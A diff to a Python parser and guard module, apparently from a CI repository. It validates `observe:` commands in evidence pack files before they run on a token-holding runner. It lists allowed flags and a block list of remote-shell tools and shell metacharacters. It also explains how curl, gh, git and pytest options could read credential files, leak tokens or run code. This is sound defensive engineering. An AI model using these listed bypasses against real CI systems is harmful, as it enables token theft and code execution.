@@ -1,28 +1,15 @@
 #!/usr/bin/env python3
-"""bites_parse.py — turn the `Bites:` contract from prose into something a machine can run.
+"""bites_parse.py - turn the `Bites:` contract from prose into something a machine can run.
 
-THE FINDING (measured 2026-09-04 over the 177 PRs merged since 2026-09-01).
-Every verification contract in this repository is prose honoured by an LLM. The
-builder contract says each PR body carries a `Bites:` line naming the CONSUMER
-and the observation that proves the change is in force — 110 of 177 bodies (62%)
-carry one. Not one of them is read by anything: `grep -rlE Bites .github/workflows
-scripts/*.py scripts/ci/*.py infra/claude-hooks` returned zero files. The machine
-verifies the DIFF; the runtime is verified by a sentence someone wrote about it.
+Every verification contract in this repository is prose honoured by an LLM: 110 of the
+177 PRs merged since 2026-09-01 carry a `Bites:` line, and nothing reads any of them.
+This module is the first half of the cure - a `bites` block a machine can PARSE, and a
+runner can later EXECUTE. It executes nothing itself, so the security model can be
+reviewed and tested with no runner anywhere near it.
 
-This module is the first half of the cure: a `bites` block a machine can PARSE and
-a runner can later EXECUTE. It executes nothing itself — it is a parser and a set
-of guards, deliberately separable from the executor that will consume it, so the
-security model can be reviewed and tested without a runner anywhere near it.
-
-WHERE THE CONTRACT LIVES, and why it moved (RULED 2026-09-04, Zero, Legge 5).
-The first draft read the block out of the PR BODY, which meant deciding which
-Markdown region a human actually SAW: a `<!-- -->` comment, a fenced block, a
-four-space indent, a raw `<pre>` all render as page furniture rather than as a
-contract, and a block hidden in one of them must not become an executable
-observation. Three adversarial rounds closed five spellings of that one defect and
-found a sixth; CodeQL named the pattern independently (`py/bad-tag-filter`). The
-class does not close by patching — a hand-rolled CommonMark reader can only ever
-approximate the renderer it is guessing at. So the contract MOVED into the diff:
+Why the contract lives in the DIFF rather than in the PR body, and the measurement
+behind that count: docs/plans/2026-09-03-relaunch-lanes/LANE-H-bites-reconciler.md
+(RULED 2026-09-04, Zero, Legge 5).
 
     evidence/<YYYY-MM>/<slug>/pack.yml     # the dated dir from evidence_paths.py
 
@@ -32,86 +19,46 @@ approximate the renderer it is guessing at. So the contract MOVED into the diff:
           observe: python3 scripts/ci/bites_parse.py --selftest
           expect: exit0
 
-Same four keys, parsed by a REAL YAML parser. Hidden regions and line-splitting
-cease to exist rather than being guarded: a pack has no rendered form, so there is
-no gap between what a reviewer sees and what the machine reads. The PR body goes
-back to prose for humans — at most a pointer to the pack path.
-
 THREE PARSE OUTCOMES, and the difference between them is the whole migration story:
 
-  absent     — the pack has no `bites:` key at all.        -> {"absent": true},  exit 0
-               Every one of the 148 packs on main today.
-  legacy     — a `bites:` block with no `observe:` key.     -> {"legacy": true},  exit 0
-  executable — an `observe:` key is present.                -> the four fields,   exit 0
-               Malformed (missing key, guard violation)     -> {"malformed":...}, exit 2
+  absent     - no `bites:` key at all.                     -> {"absent": true},  exit 0
+  legacy     - a `bites:` block with no `observe:` key.    -> {"legacy": true},  exit 0
+  executable - an `observe:` key is present.               -> the four fields,   exit 0
+               Malformed (missing key, guard violation)    -> {"malformed":...}, exit 2
 
-`absent` and `legacy` are NEVER an error. A lint built on this must judge the pack
-under review and never history: no merged pack may turn red retroactively because a
-format arrived after it.
+`absent` and `legacy` are NEVER an error: no merged pack may turn red retroactively
+because a format arrived after it.
 
-THE SECURITY MODEL, which is the point rather than a footnote. `observe:` comes from
-a file in a PULL REQUEST — text any account that can open a PR controls — and the
-executor that will consume this parser runs on a GitHub runner holding a token. So
-the guards below are an ALLOW-LIST, not a deny-list, and they run at PARSE time: a
-command that does not pass them never becomes an executable block at all, which
-means no downstream caller can forget to check.
-
-  _guard_shell_composition  no way to chain, substitute, redirect or expand. `$`
-                            is rejected too, not only command substitution — a
-                            bare `$SECRET` in an argument cannot execute anything,
-                            but sending it as part of a URL exfiltrates it just as
-                            well. The ONE substitution the format offers is the
-                            literal placeholder `{sha}`, which the executor
-                            replaces with the merged commit sha.
-  _guard_command_allowlist  first token must be one of gh, curl, git, python3,
-                            fly, flyctl — and each carries its own narrowing:
-                            python3 runs only `scripts/...` or `-m pytest`; fly,
-                            flyctl and gh only their read-only subcommand PAIRS;
-                            curl may not write a file or read a config file, and
-                            must be https.
-  _guard_no_remote_shell    ssh, scp, sftp, rsync, nc anywhere in the command, not
-                            just in first position. The allow-list already bars
-                            them from position one; this bars `git clone ssh://...`
-                            and every other shape where the reach is an ARGUMENT.
-                            Superscar #3's under-match twin: a guard that inspects
-                            only the head of a command is a guard on a spelling.
-  _guard_path_containment   no `..` segment and no absolute path argument: the
-                            observation runs inside the checkout or not at all.
-  _guard_expect_form        expect is exit0, contains:<text>, or regex:<pattern>,
-                            and a regex must actually compile — an uncompilable
-                            pattern is a comparison that can only ever throw.
-  _guard_where_scope        where is one of ci, fly, pro, mini.
-  _guard_no_invisible       no zero-width or soft-hyphen character in any of the
-                            four values. YAML removes the question of which REGION
-                            a reader saw; it does not remove the question of which
-                            CHARACTERS a value holds: a `git status` carrying a
-                            zero-width space renders exactly like one without.
+THE SECURITY MODEL is the point rather than a footnote. `observe:` comes from a file in a
+PULL REQUEST - text any account that can open a PR controls - and the executor that will
+consume this parser runs on a GitHub runner holding a token. So the rules are an
+ALLOW-LIST, and they run at PARSE time: a command that fails them never becomes an
+executable block, so no downstream caller can forget to check. The list itself, with the
+scar record for every entry, is DATA in `bites_allowlist.yaml`; each `_guard_*` function
+below documents what it refuses and why.
 
 WHAT THIS MODULE DELIBERATELY DOES NOT DO: decide whether a command may run. Trust
-(author_association, fork-ness) is the EXECUTOR's question, not the parser's — a
-Dependabot pack parses exactly like anyone else's and is simply never executed.
-Keeping that split means these guards can be unit-tested with no network, no token
-and no runner, which is why they are testable at all.
+(author_association, fork-ness) is the EXECUTOR's question - a Dependabot pack parses
+exactly like anyone else's and is simply never executed.
 
-TWO CONSTRAINTS THE EXECUTOR INHERITS AND MUST HONOUR, because they are not decidable
-from a command string. Neither is a note: PR-2 ships tests for both or it ships a hole.
+TWO CONSTRAINTS THE EXECUTOR INHERITS, because neither is decidable from a command
+string. Neither is a note: PR-2 ships tests for both or it ships a hole.
 
 (1) A SANITISED ENVIRONMENT. Half of git's dangerous behaviour is reached through CONFIG
-rather than through argv, and no allow-list over a command line can see it: `diff` runs an
-external diff or textconv filter, `status` starts `core.fsmonitor`, `cat-file` lazy-fetches
-in a partial clone, a `%G` format runs `gpg.program`, and a pager starts on a TTY. The
-executor therefore runs every observation with `GIT_CONFIG_GLOBAL=/dev/null`,
-`GIT_CONFIG_SYSTEM=/dev/null`, `GIT_ATTR_NOSYSTEM=1`, `GIT_PAGER=cat`, `GIT_TERMINAL_PROMPT=0`,
-`GIT_OPTIONAL_LOCKS=0`, and curl with `-q` prepended (curl reads `~/.curlrc` on every
-invocation, and that file can carry `output=`). That is one rule against a whole class,
-where argv-level rules would have been a list of the config keys somebody remembered.
+rather than argv, where no allow-list over a command line can see it: `diff` runs an
+external diff or textconv filter, `status` starts `core.fsmonitor`, `cat-file`
+lazy-fetches in a partial clone, a `%G` format runs `gpg.program`, a pager starts on a
+TTY. The executor therefore runs every observation with `GIT_CONFIG_GLOBAL=/dev/null`,
+`GIT_CONFIG_SYSTEM=/dev/null`, `GIT_ATTR_NOSYSTEM=1`, `GIT_PAGER=cat`,
+`GIT_TERMINAL_PROMPT=0`, `GIT_OPTIONAL_LOCKS=0`, and curl with `-q` prepended (curl reads
+`~/.curlrc` on every invocation, and that file can carry `output=`). One rule against a
+whole class, where argv-level rules would be a list of the config keys somebody remembered.
 
-(2) POST-MERGE ONLY.
-A pull request can add a script and its `bites-observable` marker in the same diff, so
-the marker is exactly as strong as the review of the diff that introduces it — no more.
-Post-merge, the marked script is reviewed, merged code. Against an unmerged PR checkout
-there is no boundary here at all, and the same holds for `python3 -m pytest`, which
-imports whatever `conftest.py` the branch happens to carry.
+(2) POST-MERGE ONLY. A pull request can add a script and its `bites-observable` marker in
+the same diff, so the marker is exactly as strong as the review of the diff that
+introduces it - no more. Post-merge, the marked script is reviewed, merged code. Against
+an unmerged PR checkout there is no boundary here at all, and the same holds for
+`python3 -m pytest`, which imports whatever `conftest.py` the branch happens to carry.
 """
 
 # bites-observable — this script is reachable from an `observe:` line. It qualifies
@@ -141,199 +88,78 @@ REPO_ROOT = Path(__file__).resolve().parents[2]
 #: only has to know it is not an attempt at shell expansion.
 SHA_PLACEHOLDER = "{sha}"
 
-#: The four keys, and the top-level key they live under in `pack.yml`.
-BITES_KEY = "bites"
-REQUIRED_KEYS = ("consumer", "where", "observe", "expect")
+#: The security model is DATA, in `bites_allowlist.yaml` beside this file. It was ~200
+#: lines of constants and rationale inside this module until 2026-09-04, when Zero ruled
+#: the module had to shrink. The rationale moved WITH the data rather than into a
+#: document: a rule whose scar record lives elsewhere is a rule the next editor deletes
+#: without knowing what it cost. Names below are unchanged, so every caller and every
+#: test still reads the same identifiers.
+SPEC_PATH = Path(__file__).with_name("bites_allowlist.yaml")
 
-WHERE_SCOPES = ("ci", "fly", "pro", "mini")
 
-#: First-token allow-list. Anything not here is rejected outright.
-ALLOWED_COMMANDS = ("gh", "curl", "git", "python3", "fly", "flyctl")
+def _load_spec(path: Path) -> dict[str, Any]:
+    """Read the allow-list. Unreadable or empty is fatal, never an empty allow-list.
 
-#: What may follow an allow-listed subcommand word. The first draft spelled both of
-#: these `None`, which read as "anything may follow" and was two different rules
-#: wearing one name: `gh api <path>` is followed by DATA, while `fly version` is
-#: followed by nothing — and `fly version upgrade` REPLACES THE BINARY. Naming the
-#: two cases apart is what closes that hole, and it generalises: every allow-list
-#: entry is now a full pair that declares which of the two it is.
+    An allow-list that fails open admits everything; an allow-list that fails to an
+    EMPTY tuple refuses everything and looks like a broken parser rather than a
+    breached one. Neither is a state this file may reach silently (superscar #2).
+    """
+    try:
+        spec = yaml.safe_load(path.read_text(encoding="utf-8"))
+    except OSError as exc:
+        raise SystemExit(f"bites_parse: allow-list unreadable at {path}: {exc}") from exc
+    if not isinstance(spec, dict) or not spec.get("commands"):
+        raise SystemExit(f"bites_parse: allow-list at {path} is empty or malformed")
+    return spec
+
+
+def _flat(rows: list[Any] | None) -> tuple[str, ...]:
+    """Flatten the file's comma-joined rows. Rows exist so the data stays readable."""
+    out: list[str] = []
+    for row in rows or []:
+        out.extend(w.strip() for w in row.split(",")) if isinstance(row, str) else out.append(row)
+    return tuple(w for w in out if w)
+
+
+def _pairs(rows: list[Any]) -> tuple[tuple[str, str], ...]:
+    """Subcommand PAIRS, with the two sentinels resolved."""
+    return tuple((a, {"NO_SUBCOMMAND": NO_SUBCOMMAND,
+                      "ANY_POSITIONAL": ANY_POSITIONAL}.get(b, b)) for a, b in rows)
+
+
+#: What may follow an allow-listed subcommand word. The first draft spelled both of these
+#: `None`, which read as "anything may follow" and was two rules wearing one name:
+#: `gh api <path>` is followed by DATA, `fly version` by nothing - and `fly version
+#: upgrade` REPLACES THE BINARY. See the file for the full record.
 NO_SUBCOMMAND = "\x00no-subcommand"    # nothing but flags may follow
 ANY_POSITIONAL = "\x00any-positional"  # a data argument follows, never a verb
 
-#: Read-only fly/flyctl subcommand PAIRS. The first draft listed FIRST WORDS only, and
-#: `machine` was one of them — which Kimi K3, refuting this file on 2026-09-04, pointed
-#: out admits `fly machine run <image>`: arbitrary container execution on production
-#: infrastructure, through a guard whose whole purpose was to keep observations read-only.
-#: `fly machine destroy` and `fly machine update` came through the same gap. A one-word
-#: check on a command with two-word subcommands is superscar #3's under-match, and it
-#: recurred a third time on `("version", None)`: `fly version upgrade` downloads and
-#: installs a new flyctl. NO_SUBCOMMAND is the fix for that whole shape.
-FLY_READONLY_SUBCOMMANDS = (
-    ("status", NO_SUBCOMMAND), ("releases", NO_SUBCOMMAND),
-    ("version", NO_SUBCOMMAND), ("logs", NO_SUBCOMMAND),
-    ("image", "show"), ("machine", "list"), ("machine", "status"),
-)
+_SPEC = _load_spec(SPEC_PATH)
 
-#: curl options an observation may use. INVERTED to an allow-list on 2026-09-04, after
-#: the FOURTH hole in the deny-list it replaces. The deny-list had already lost `-b`
-#: (reads .git/config, where actions/checkout persists the token), `-w@<path>` (prints a
-#: local file to stdout), `--netrc-file` and `--variable`; a fifth review found three more
-#: in one pass — `--json=@<path>` (documented as a shortcut for `--data`, and it takes the
-#: same `@filename` file-read syntax), `--libcurl=<path>` (writes a generated C file) and
-#: `--etag-save=<path>` (writes a file whose content the remote controls). curl 8.7 has
-#: over two hundred options and a deny-list over them can only ever be a list of the ones
-#: someone thought of. Rule 8: a surface that fails four times in the same way is
-#: under-specified, so this is the SPEC — everything not named here is refused, and adding
-#: an option means adding it here with a guilt and an innocence proof.
-#:
-#: Value-taking options must be written `--flag=value`, which the "exactly one non-flag
-#: argument" rule below already forces. A value beginning with `@` is refused wherever it
-#: appears: `-H @file` and `--json @file` both make curl read a local file into the request.
-CURL_ALLOWED_FLAGS = (
-    "-s", "--silent", "-S", "--show-error", "-f", "--fail", "--fail-with-body",
-    "-L", "--location", "-i", "--include", "-I", "--head", "--compressed",
-    "-m", "--max-time", "--connect-timeout", "--max-redirs",
-    "--retry", "--retry-delay", "--retry-max-time", "-w", "--write-out",
-    "-H", "--header", "-A", "--user-agent", "--http1.1", "--http2", "--ipv4", "--ipv6",
-)
+BITES_KEY = _SPEC["key"]
+REQUIRED_KEYS = tuple(_SPEC["required_keys"])
+WHERE_SCOPES = tuple(_SPEC["where_scopes"])
+ALLOWED_COMMANDS = tuple(_SPEC["commands"])
 
-#: Short options that carry no value, so they may be bundled (`-sS`, `-sSL`).
-CURL_ALLOWED_SHORT_BUNDLE = "sSfLiI"
+FLY_READONLY_SUBCOMMANDS = _pairs(_SPEC["fly"]["subcommands"])
+FLY_ALLOWED_FLAGS = _flat(_SPEC["fly"]["flags"])
+CURL_ALLOWED_FLAGS = _flat(_SPEC["curl"]["flags"])
+CURL_ALLOWED_SHORT_BUNDLE = _SPEC["curl"]["short_bundle"]
+CURL_VALUE_TAKING_FLAGS = _flat(_SPEC["curl"]["value_taking"])
+PYTEST_ALLOWED_FLAGS = _flat(_SPEC["pytest"]["flags"])
+PYTEST_VALUE_TAKING_FLAGS = _flat(_SPEC["pytest"]["value_taking"])
+GH_READONLY_SUBCOMMANDS = _pairs(_SPEC["gh"]["subcommands"])
+GH_ALLOWED_FLAGS = _flat(_SPEC["gh"]["flags"])
+GH_API_FORBIDDEN_FLAGS = _flat(_SPEC["gh"]["api_forbidden"])
+GIT_READONLY_SUBCOMMANDS = _flat(_SPEC["git"]["subcommands"])
+GIT_GLOBAL_ALLOWED_FLAGS = _flat(_SPEC["git"]["global_flags"])
+GIT_SUB_ALLOWED_FLAGS = _flat(_SPEC["git"]["flags"])
+GIT_NUMERIC_FLAG_PREFIXES = _flat(_SPEC["git"]["numeric_prefixes"])
+OBSERVABLE_MARKER = _SPEC["observable_marker"]
+REMOTE_SHELL_TOKENS = _flat(_SPEC["remote_shell_tokens"])
+_SHELL_METACHARS = tuple(_SPEC["shell_metachars"])
+_INVISIBLE_CHARS = tuple(_SPEC["invisible_chars"])
 
-#: Options whose value is the NEXT token unless glued. They are consumed in pairs rather
-#: than counted as the URL, which is what lets this repo's own idioms through:
-#: `curl -fsS -m 5 <url>` appears in five scripts and `-w "%{http_code}"` is the standard
-#: health check. `-w@<path>` stays refused — by _guard_args_from_file, which judges the
-#: VALUE, so re-admitting the option does not reopen the hole it was removed for.
-CURL_VALUE_TAKING_FLAGS = (
-    "-H", "--header", "-A", "--user-agent", "-m", "--max-time", "--connect-timeout",
-    "--max-redirs", "--retry", "--retry-delay", "--retry-max-time", "-w", "--write-out",
-)
-
-#: pytest options an observation may use. An allow-list for the third time in this file,
-#: and for the same reason: the deny-list it replaces named the options that choose code to
-#: IMPORT (`-p`, `-o`, `--override-ini`, `--rootdir`, `--import-mode`, `--pdb`, `--assert`)
-#: and never considered the ones that WRITE. `--junitxml=<relative path>` writes an XML
-#: report anywhere in the checkout, including over a source file, and the path guard permits
-#: a relative path by design.
-PYTEST_ALLOWED_FLAGS = (
-    "-q", "--quiet", "-v", "--verbose", "-x", "--exitfirst", "--tb", "-k", "-m",
-    "--maxfail", "--no-header", "--no-summary", "-r", "--durations", "--color",
-    "--strict-markers", "--strict-config", "--capture", "-s",
-)
-#: Options whose value is a separate word unless it is glued with `=`. They must be
-#: written `--flag=value`, because a separate value is indistinguishable from a test path
-#: to any reader of argv — `pytest -k tests` looks like the target `tests`.
-PYTEST_VALUE_TAKING_FLAGS = (
-    "-k", "-m", "-r", "--maxfail", "--durations", "--tb", "--capture", "--color",
-)
-
-#: `-W` was here until 2026-09-04 and is deliberately gone: pytest resolves a warning
-#: filter's category with `__import__`, so `-W error::evil.Custom` imports a module the
-#: argument names. An allow-list of OPTIONS still has to ask what each option's VALUE can
-#: reach — which is the same lesson as `curl -b`, one level in.
-
-#: `gh` options an observation may use. The fourth list inverted, and the last two were
-#: inverted for findings a deny-list could not have held: `--cache=1h` persists the
-#: response to a local cache (a write), and `--web` opens a browser. The deny-list it
-#: replaces named only the retargeting flags (`-R`, `--repo`, `--hostname`).
-GH_ALLOWED_FLAGS = (
-    "--json", "--jq", "-q", "--template", "-t", "--limit", "-L", "--state", "-s",
-    "--paginate", "--header", "-H", "--slurp",
-)
-
-#: `git` GLOBAL options — the ones before the subcommand — are an allow-list with NOTHING
-#: in it. `-c` is code execution, `--paginate` starts $PAGER, `--help` becomes `git help`
-#: which starts man or a browser, `-C`/`--git-dir`/`--work-tree` retarget the tree. An
-#: observation has never needed one, so the honest allow-list is empty rather than a list
-#: of the dangerous ones somebody remembered.
-GIT_GLOBAL_ALLOWED_FLAGS: tuple[str, ...] = ()
-
-#: `fly`/`flyctl` options. `-c`/`--config` READS a file the argument names, which is how
-#: `fly status --config=.git/config` reached a credential file through a subcommand table
-#: that was otherwise correct — the pairs were checked and the flags were not.
-FLY_ALLOWED_FLAGS = ("-a", "--app", "--json", "-j", "--now", "--all")
-
-#: A script is reachable by `observe:` only if its own SOURCE carries this marker.
-#: Codex, red-teaming this file on 2026-09-04, made the point that killed the first
-#: draft's rule: allow-listing `python3 scripts/...` allow-lists roughly nine hundred
-#: scripts, and it named the worst ones by path. `scripts/usage/cswap.py run <cmd>`
-#: reaches `os.execvpe`; `scripts/ci/restore_drill_verify.py --psql-bin` and
-#: `scripts/ci/stage_council_journal.py --git-bin` each execute a binary the argument
-#: names; a dozen more take a `--dsn`, a `--database-url` or an `--output-db`. A path
-#: prefix is not a capability boundary. The marker is: a script is observable because
-#: someone wrote in it that it is, which is content-keyed rather than location-keyed
-#: (W109: an exemption keyed to where a file sits rather than what it is, is itself a
-#: scar). Absent marker, absent file, unreadable file -> refused.
-OBSERVABLE_MARKER = "bites-observable"
-
-#: `gh` subcommand PAIRS that only read. `gh pr merge`, `gh workflow run`, `gh api -X POST`
-#: and `gh repo clone` all act; an allow-list keyed on `gh` alone would permit every one.
-GH_READONLY_SUBCOMMANDS = (
-    ("pr", "view"), ("pr", "list"), ("pr", "diff"), ("pr", "checks"),
-    ("run", "view"), ("run", "list"), ("release", "view"), ("workflow", "view"),
-    ("issue", "view"), ("issue", "list"), ("search", "prs"), ("api", ANY_POSITIONAL),
-)
-
-#: `gh api` flags that turn a read into a write or read a body from a file.
-GH_API_FORBIDDEN_FLAGS = ("-X", "--method", "-f", "-F", "--field", "--raw-field", "--input")
-
-#: `git` subcommands that only read the local object store. `clone`, `fetch`, `push`,
-#: `remote` and `submodule` all reach the network; the rest here do not.
-#: `tag` and `branch` were here in the first draft and are gone: with an argument they
-#: CREATE a ref, which is a write to the object store, and `-d` deletes one. "Read-only"
-#: has to mean the subcommand cannot write in any invocation, not that its common form
-#: happens not to. These stay single words rather than pairs because each is a terminal
-#: verb: git's namespaced subcommands (`stash list`, `notes add`, `remote add`) are all
-#: absent from this list, so there is no second word here that could name an action.
-GIT_READONLY_SUBCOMMANDS = (
-    "log", "show", "status", "diff", "rev-parse", "ls-tree", "cat-file", "grep",
-    "describe", "ls-files", "shortlog", "blame", "rev-list",
-)
-
-
-#: Subcommand options an observation may use, checked AFTER the subcommand word. Inverted
-#: to an allow-list for the same reason as curl's, and after the same shape of failure
-#: three times over: `git diff --output=<relative>` writes a file the path guard permits;
-#: `git grep -O<cmd>` opens matches in a PAGER COMMAND the argument names; and
-#: `git diff --no-index <a> <b>` leaves the repository entirely and diffs two arbitrary
-#: files, which turns a repo-scoped read into a filesystem read. Each was found by a
-#: different reviewer, none by the list itself.
-#:
-#: A bare `-<digits>` (`git log -1`) is accepted as a count. Everything else not named
-#: here is refused, and adding an option means adding it here with both proofs.
-GIT_SUB_ALLOWED_FLAGS = (
-    "-n", "--max-count", "--skip", "--oneline", "--format", "--pretty", "--date",
-    "--name-only", "--name-status", "--stat", "--numstat", "--shortstat",
-    "--abbrev-commit", "--no-abbrev-commit", "--no-color", "--color", "--no-patch",
-    "--no-merges", "--merges", "--first-parent", "--follow", "--reverse", "--graph",
-    "--since", "--until", "--author", "--committer", "--grep", "--all", "--decorate",
-    "--cached", "--staged", "--porcelain", "--short", "--branch", "--exit-code",
-    "--quiet", "-q", "-c", "-l", "-L", "-i", "-E", "-w", "-h", "-r", "-t", "-p", "-s",
-    "--count", "--files-with-matches", "--files-without-match", "--line-number",
-    "--word-diff", "--full-tree", "--name-rev", "--verify", "--abbrev-ref",
-    "--show-toplevel", "--is-inside-work-tree", "--symbolic-full-name", "--tags",
-    "--contains", "--long", "--dirty", "--check", "--summary", "--find-renames",
-    # Added 2026-09-04 after a review measured the OVER-match the inversion introduced:
-    # each of these is display-shape only, and each is already in daily use in this repo
-    # (`--diff-filter=` in 8 files, `--no-renames` in 11, `--` in the standard
-    # `git diff --name-only HEAD -- <path>` idiom). Inverting a list is only safe if the
-    # real shapes survive it, and three of them did not.
-    "--diff-filter", "--no-renames", "--no-ext-diff", "--no-textconv", "-z", "--",
-)
-
-#: `-U<n>` (diff context) and `-<n>` (commit count) are numeric options nothing can
-#: enumerate, and neither can name a file or a program.
-GIT_NUMERIC_FLAG_PREFIXES = ("-U",)
-
-#: Invisible characters. A value containing one reads identically to a value without
-#: it, so the human reviewer and the parser can be shown two different contracts.
-_INVISIBLE_CHARS = ("\u200b", "\u200c", "\u200d", "\u2060", "\ufeff", "\u00ad")
-
-#: Tokens that reach another machine. Barred ANYWHERE, not just in first position.
-REMOTE_SHELL_TOKENS = ("ssh", "scp", "sftp", "rsync", "nc", "netcat", "telnet")
-
-#: Characters that would let one command become two, or become a different one.
-_SHELL_METACHARS = ("|", ";", "&", "$", "`", "(", ")", "<", ">", "\n", "\r", "\\")
 
 # --------------------------------------------------------------------- guards
 
@@ -465,188 +291,177 @@ def _render_table(table: tuple[tuple[str, str], ...], prefix: str) -> str:
     )
 
 
+def _flag_violation(tokens: list[str], allowed: tuple[str, ...], *,
+                    numeric: bool = False) -> str | None:
+    """The first flag not on the allow-list, or None. One loop for five commands.
+
+    It was written out five times before 2026-09-04. The copies had NOT drifted - a
+    differential over 1,501 invocations across all six commands reports zero verdict
+    changes from the merge - so this is a size cut, not a bug fix, and it is recorded
+    as one. The only asymmetry the five copies carried is pytest's `-o<name>=<value>`
+    normalisation, kept here: `-O` (git grep's pager option) is a different, uppercase
+    flag and is still refused.
+    """
+    for token in tokens:
+        if not token.startswith("-"):
+            continue
+        base = token.split("=", 1)[0]
+        if base.startswith("-o") and base != "-o":   # pytest's `-o<name>=<value>`
+            base = "-o"
+        if base in allowed or (numeric and _is_count_flag(base)):
+            continue
+        return base
+    return None
+
+
+def _see(section: str) -> str:
+    """Every refusal ends at the entry's own scar record instead of restating it."""
+    return f"see the `{section}` section of scripts/ci/bites_allowlist.yaml"
+
+
+def _check_python3(head: str, rest: list[str]) -> list[str]:
+    if rest[:1] != ["-m"]:
+        if not (rest and rest[0].startswith("scripts/")):
+            return ["observe: `python3` must run `scripts/...` from the checkout, or "
+                    "`python3 -m pytest`"]
+        return []
+    if rest[1:2] != ["pytest"]:
+        return ["observe: `python3 -m` is permitted only for `pytest`"]
+    for flag in rest[2:]:
+        if flag.split("=", 1)[0] in PYTEST_VALUE_TAKING_FLAGS and "=" not in flag:
+            return [f"observe: write `pytest {flag}=<value>`. With a separate value there "
+                    f"is no way to tell an option's value from a test path - `pytest -k "
+                    f"tests` reads as the target `tests`, which exists, and pytest then "
+                    f"discovers every test from the working directory."]
+    bad = _flag_violation(rest[2:], PYTEST_ALLOWED_FLAGS)
+    if bad:
+        return [f"observe: `pytest {bad}` is not an allow-listed option - {_see('pytest')}"]
+    if not [a for a in rest[2:] if not a.startswith("-")]:
+        return ["observe: `pytest` with no target discovers every test from the working "
+                "directory. Name the test path the observation is about."]
+    return []
+
+
+def _check_fly(head: str, rest: list[str]) -> list[str]:
+    words = _leading_words(rest)
+    if not _subcommand_permitted(words, FLY_READONLY_SUBCOMMANDS):
+        return [f"observe: `{head} {' '.join(words[:2]) or '<none>'}` is not a read-only "
+                f"subcommand - permitted: " + _render_table(FLY_READONLY_SUBCOMMANDS, "")]
+    bad = _flag_violation(rest, FLY_ALLOWED_FLAGS)
+    if bad:
+        return [f"observe: `{head} {bad}` is not an allow-listed option - `-c`/`--config` "
+                f"READS the file its argument names. {_see('fly')}"]
+    return []
+
+
+def _check_gh(head: str, rest: list[str]) -> list[str]:
+    words = _leading_words(rest)
+    if not _subcommand_permitted(words, GH_READONLY_SUBCOMMANDS):
+        return [f"observe: `gh {' '.join(words[:2]) or '<none>'}` is not a read-only "
+                f"subcommand - permitted: " + _render_table(GH_READONLY_SUBCOMMANDS, "gh ")]
+    bad = _flag_violation(rest, GH_ALLOWED_FLAGS)
+    if bad:
+        return [f"observe: `gh {bad}` is not an allow-listed option - `--cache` writes a "
+                f"response cache and `--web` opens a browser. {_see('gh')}"]
+    if words[:1] == ["api"]:
+        for flag in rest:
+            base = _any_flag_is(flag, GH_API_FORBIDDEN_FLAGS)
+            if base:
+                return [f"observe: `gh api {base}` sends a request body or a method other "
+                        f"than GET - an observation reads"]
+        for token in rest:
+            if not token.startswith("-") and "://" in token:
+                return [f"observe: `gh api {token}` names an absolute URL. gh uses an "
+                        f"endpoint containing `://` VERBATIM as the request URL, so the "
+                        f"host comes from the argument rather than from GitHub; and for a "
+                        f"non-GitHub host gh falls through to $GH_ENTERPRISE_TOKEN / "
+                        f"$GITHUB_ENTERPRISE_TOKEN unconditionally, sending it as an "
+                        f"Authorization header to whatever host the argument named. "
+                        f"An observation names a REST path: `repos/<owner>/<repo>`."]
+    return []
+
+
+def _check_git(head: str, rest: list[str]) -> list[str]:
+    sub_at = next((i for i, a in enumerate(rest) if not a.startswith("-")), len(rest))
+    bad = _flag_violation(rest[:sub_at], GIT_GLOBAL_ALLOWED_FLAGS)
+    if bad:
+        return [f"observe: `git {bad}` is a GLOBAL git option, and none are permitted - "
+                f"`-c` runs a program the argument names and `--paginate` starts $PAGER. "
+                f"Put the subcommand first. {_see('git')}"]
+    for flag in rest[sub_at + 1:]:
+        if flag.split("=", 1)[0] in ("--format", "--pretty") and "%G" in flag:
+            return ["observe: a `%G` pretty-format placeholder asks git to VERIFY a "
+                    "signature, which runs `gpg.program` - a program a config value names"]
+    bad = _flag_violation(rest[sub_at + 1:], GIT_SUB_ALLOWED_FLAGS, numeric=True)
+    if bad:
+        return [f"observe: `git {bad}` is not an allow-listed option - the deny-list this "
+                f"replaced lost `--output`, `-O` and `--no-index` one at a time. "
+                f"{_see('git')}"]
+    sub = rest[sub_at] if sub_at < len(rest) else ""
+    if sub not in GIT_READONLY_SUBCOMMANDS:
+        return [f"observe: `git {sub or '<none>'}` is not a local read-only subcommand - "
+                f"permitted: {', '.join(GIT_READONLY_SUBCOMMANDS)}"]
+    return []
+
+
+def _check_curl(head: str, rest: list[str]) -> list[str]:
+    for flag in rest:
+        if not flag.startswith("-"):
+            continue
+        base, _, value = flag.partition("=")
+        if value.startswith("@") or (base not in CURL_ALLOWED_FLAGS and "@" in flag):
+            return ["observe: a curl option whose value begins with `@` makes curl READ A "
+                    "LOCAL FILE into the request - an observation reads the network, not "
+                    "the disk"]
+        if base in CURL_ALLOWED_FLAGS:
+            continue
+        if not base.startswith("--") and len(base) > 1 and all(
+                c in CURL_ALLOWED_SHORT_BUNDLE for c in base[1:]):
+            continue  # a bundle of valueless short options, e.g. -sS
+        return [f"observe: `curl {base}` is not an allow-listed option - the deny-list it "
+                f"replaced lost `-b`, `-w@`, `--netrc-file`, `--variable`, `--json=@`, "
+                f"`--libcurl` and `--etag-save` one at a time. {_see('curl')}"]
+    # The first draft only checked args that LOOKED like URLs, so `curl evil.test/x` sailed
+    # through and curl defaulted it to plain http. The rule is positive: exactly one
+    # non-flag argument, https. Consuming a value-taking option's value by ARITY rather
+    # than by "does it start with -" is what admits `curl -m 5 <url>` and
+    # `-w '%{http_code}' <url>` without admitting a second URL.
+    words: list[str] = []
+    skip_next = False
+    for token in rest:
+        if skip_next:
+            skip_next = False
+        elif token in CURL_VALUE_TAKING_FLAGS:
+            skip_next = True
+        elif not token.startswith("-"):
+            words.append(token)
+    if len(words) != 1:
+        return [f"observe: `curl` must take exactly one non-flag argument (the https URL); "
+                f"found {len(words)}. Write value-taking flags as `--flag=value`."]
+    if not words[0].startswith("https://"):
+        return [f"observe: `curl` target `{words[0]}` is not an https:// URL"]
+    return []
+
+
+_COMMAND_CHECKS = {
+    "python3": _check_python3, "gh": _check_gh, "git": _check_git,
+    "curl": _check_curl, "fly": _check_fly, "flyctl": _check_fly,
+}
+
+
 def _guard_command_allowlist(command: str) -> list[str]:
-    """First token must be allow-listed, and each allowed command is narrowed."""
+    """First token must be allow-listed, and each allowed command is then narrowed."""
     try:
         argv = shlex.split(command)
     except ValueError as exc:
         return [f"observe: not parseable as a command ({exc})"]
     if not argv:
         return ["observe: empty command"]
-    head = argv[0]
